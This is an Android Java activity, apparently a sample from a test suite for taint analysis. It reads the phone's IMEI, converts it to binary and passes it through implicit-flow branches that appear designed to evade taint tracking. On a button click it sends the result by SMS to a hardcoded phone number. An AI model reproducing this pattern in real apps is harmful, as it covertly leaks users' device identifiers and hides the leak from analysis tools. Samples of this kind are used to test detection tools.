package com.examples.evasion.bvb.diversionbypartinfovasion;


import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.Arrays;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    protected int X[];
    public String mobileNo = "+919825046179";
    String results = "";
    public static String RA = "";
    public static String RB = "";
    public static String RC = "";
    public static String RD = "";
    public static String RE = "";
    public static String K = "";
    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String binaryIMEI = "";


        Button button = (Button) findViewById(R.id.sendMsg);
        int tf = 24;
        binaryIMEI = stringToBinary(getIMEI(this));
        char[] list = binaryIMEI.toCharArray();

        X = new int[binaryIMEI.length()];

        for (int i = 0; i < binaryIMEI.length(); i++) {
            X[i] = Character.digit(list[i], 10);
        }

        for (int i = 0; i < X.length; i++) {
            if (X[i] == 1) {
                tf = 24;
            } else {
                tf = 12;
            }

            if (i < (X.length/5)) {
                if (tf == 24) {
                    RA += "1";
                } else {
                    RA += "0";
                }
            } else if (i < (X.length*2/5)) {
                if (tf == 24) {
                    RB += "1";
                } else {
                    RB += "0";
                }
            } else if (i < (X.length*3/5)) {
                if (tf == 24) {
                    RC += "1";
                } else {
                    RC += "0";
                }
            } else if (i < (X.length*4/5)) {
                if (tf == 24) {
                    RD += "1";
                } else {
                    RD += "0";
                }
            } else if (i < (X.length)) {
                if (tf == 24) {
                    RE += "1";
                } else {
                    RE += "0";
                }
            }

        }

        K = RA + RB + RC + RD + RE;

        results = K;
        button.setOnClickListener(this);
    }
    public String getIMEI(Context context) {
        TelephonyManager mngr = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        String imei = mngr.getDeviceId();
        return imei;
    }

    public static String stringToBinary(String str) {

        String result = "";
        char[] messChar = str.toCharArray();

        for (int i = 0; i < messChar.length; i++) {
            result += Integer.toBinaryString(messChar[i]);
        }
        return result;
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.sendMsg:
                //sendMsg();
                //Getting intent and PendingIntent instance
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                PendingIntent pi = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);
                //Get the SmsManager instance and call the sendTextMessage method to send message
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(mobileNo, null, results, pi, null);
                break;
        }
    }


}